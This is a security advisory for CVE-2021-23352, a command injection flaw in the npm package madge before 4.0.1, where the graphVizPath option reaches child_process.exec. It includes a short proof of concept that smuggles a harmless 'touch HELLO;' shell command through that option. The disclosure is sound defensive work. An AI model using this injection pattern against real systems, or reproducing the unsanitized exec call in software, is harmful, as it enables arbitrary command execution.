# [H] Madge vulnerable to command injection

## Summary
Severity: High
Advisory: GHSA-753c-phhg-cj29
CVE: CVE-2021-23352
CWE: CWE-77, CWE-89
Ecosystem: npm
Published: 2021-03-12
Source: https://github.com/advisories/GHSA-753c-phhg-cj29
Type: github-advisory

## Affected
- npm: `madge` — affected >=0 <4.0.1

## Details
This affects the package madge before 4.0.1. It is possible to specify a custom Graphviz path via the graphVizPath option parameter which, when the .image(), .svg() or .dot() functions are called, is executed by the childprocess.exec function.

### PoC
```js
const madge = require('madge'); 
madge('..', {graphVizPath: "touch HELLO;"}) .then((res) => res.svg()) .then((writtenImagePath) => { console.log('Image written to ' + writtenImagePath); });
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-23352
- https://github.com/pahen/madge/commit/da5cbc9ab30372d687fa7c324b22af7ffa5c6332
- https://github.com/pahen/madge/blob/master/lib/graph.js#L27
- https://snyk.io/vuln/SNYK-JS-MADGE-1082875
